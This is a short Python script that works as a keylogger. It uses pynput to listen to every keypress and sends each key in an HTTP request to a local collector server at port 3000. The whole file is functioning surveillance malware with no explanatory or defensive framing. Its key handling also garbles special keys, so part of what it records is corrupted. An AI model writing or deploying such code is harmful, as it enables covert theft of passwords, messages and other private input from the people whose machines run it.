from pynput.keyboard import Key, Listener
import requests

def on_press(key):
    requests.get("http://127.0.0.1:3000/key/" + str(key)[1])

with Listener(on_press=on_press) as listener :
    listener.join()